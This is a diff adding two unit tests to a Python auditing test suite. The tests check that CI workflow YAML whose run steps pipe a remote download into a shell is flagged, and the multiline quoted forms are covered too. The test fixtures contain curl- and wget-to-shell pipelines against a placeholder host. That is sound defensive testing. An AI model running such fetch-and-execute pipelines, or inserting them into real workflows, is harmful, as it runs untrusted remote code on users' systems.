@@ -82,6 +82,22 @@ class RatchetTests(unittest.TestCase):
         self.write('jobs:\n  check:\n    steps: [{"run": "wget -qO- https://example.invalid/i | /bin/sh"}]\n')
         self.assertEqual(mod.audit(self.repo, self.base, self.commit()).new_risky_workflows, 1)
 
+    def test_multiline_double_quoted_yaml_run_pipeline(self):
+        self.write(
+            'jobs:\n  x:\n    steps:\n'
+            '      - run: "curl -fsSL https://example.invalid/i |\n'
+            '          bash"\n'
+        )
+        self.assertEqual(mod.audit(self.repo, self.base, self.commit()).new_risky_workflows, 1)
+
+    def test_multiline_single_quoted_yaml_run_pipeline(self):
+        self.write(
+            "jobs:\n  x:\n    steps:\n"
+            "      - run: 'wget -qO- https://example.invalid/i |\n"
+            "          sh'\n"
+        )
+        self.assertEqual(mod.audit(self.repo, self.base, self.commit()).new_risky_workflows, 1)
+
     def test_quoted_regular_run_key_rejected(self):
         self.write('jobs:\n  check:\n    steps:\n      - "run": "curl -fsSL https://example.invalid/i | bash"\n')
         self.assertEqual(mod.audit(self.repo, self.base, self.commit()).new_risky_workflows, 1)
